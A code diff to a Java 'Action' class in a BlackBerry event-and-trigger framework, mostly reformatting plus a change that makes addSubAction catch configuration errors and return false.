@@ -24,7 +24,6 @@ import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.utils.BlockingQueueTrigger;
 
-
 /**
  * The Class Action.
  */
@@ -53,7 +52,7 @@ public class Action implements Managed {
     /** The Action id. */
     public int actionId = -1;
 
-   // Event triggeringEvent;
+    // Event triggeringEvent;
 
     Status status;
 
@@ -69,20 +68,20 @@ public class Action implements Managed {
      */
     public Action(final int actionId, String desc) {
         this.actionId = actionId;
-        this.desc=desc;
+        this.desc = desc;
         list = new CloneableVector();
         status = Status.getInstance();
         setQueue(QUEUE_FAST);
     }
 
-    public String getId() {       
+    public String getId() {
         return Integer.toString(actionId);
     }
-    
-    public int getActionId() {       
+
+    public int getActionId() {
         return actionId;
     }
-    
+
     /**
      * Gets the sub actions num.
      * 
@@ -104,42 +103,51 @@ public class Action implements Managed {
      * @throws JSONException
      * @throws ConfigurationException
      */
-    public boolean addSubAction(final ConfAction actionConf) throws GeneralException, ConfigurationException {
+    public boolean addSubAction(final ConfAction actionConf) {
 
-        if (actionConf.getType() != null) {
-            final SubAction sub = SubAction.factory(actionConf.getType(), actionConf);
-            if (sub == null) {
+        try {
+            if (actionConf.getType() != null) {
+                final SubAction sub = SubAction.factory(actionConf.getType(),
+                        actionConf);
+                if (sub == null) {
+                    //#ifdef DEBUG
+                    debug.error("addSubAction Error (addSubAction): unknown type: "
+                            + actionConf.getType());
+                    //#endif
+
+                    return false;
+                }
+
+                list.addElement(sub);
+
+                if (sub instanceof SubActionMain) {
+                    setQueue(QUEUE_MAIN);
+                }
+                return true;
+            } else {
                 //#ifdef DEBUG
-                debug.error("addSubAction Error (addSubAction): unknown type: " + actionConf.getType());
+                debug.error("addSubAction: null type");
                 //#endif
-              
+
                 return false;
             }
-            
-            list.addElement(sub);
-            
-            if (sub instanceof SubActionMain) {
-                setQueue(QUEUE_MAIN);
-            } 
-            return true;
-        } else {
+        }  catch (ConfigurationException e) {
             //#ifdef DEBUG
-            debug.error("addSubAction: null type");
+            debug.error(e);
+            debug.error("addSubAction");
             //#endif
- 
-            return false;
         }
+        return false;
     }
 
-
     private void setQueue(int queue) {
-        
-        if(queue==QUEUE_FAST){
-            this.triggerQueue=status.getTriggeredQueueFast();
-            this.queueDesc="FAST";
-        }else{
-            this.triggerQueue= status.getTriggeredQueueMain();
-            this.queueDesc="MAIN";
+
+        if (queue == QUEUE_FAST) {
+            this.triggerQueue = status.getTriggeredQueueFast();
+            this.queueDesc = "FAST";
+        } else {
+            this.triggerQueue = status.getTriggeredQueueMain();
+            this.queueDesc = "MAIN";
         }
 
     }
@@ -155,36 +163,36 @@ public class Action implements Managed {
      */
     public SubAction getSubAction(final int index) throws GeneralException {
         if (index < 0 || index >= list.size()) {
-            throw new GeneralException("Subaction index above SubAction array boundary"); //$NON-NLS-1$
+            throw new GeneralException(
+                    "Subaction index above SubAction array boundary"); //$NON-NLS-1$
         }
 
         return (SubAction) list.elementAt(index);
     }
 
-    public CloneableVector getSubActions() {        
+    public CloneableVector getSubActions() {
         return (CloneableVector) list.clone();
     }
-    
+
     public String getDesc() {
         return desc;
     }
-   
+
     //#ifdef DEBUG
     public final String toString() {
         return getId() + " [" + getDesc().toUpperCase() + "] qq: " + queueDesc;
 
     }
+
     //#endif
 
-
     public void trigger(Event event) {
-        Trigger trigger = new Trigger(actionId, event);        
+        Trigger trigger = new Trigger(actionId, event);
         triggerQueue.enqueue(trigger);
     }
 
     public void unTrigger() {
         triggerQueue.unTrigger(actionId);
     }
-
 
 }
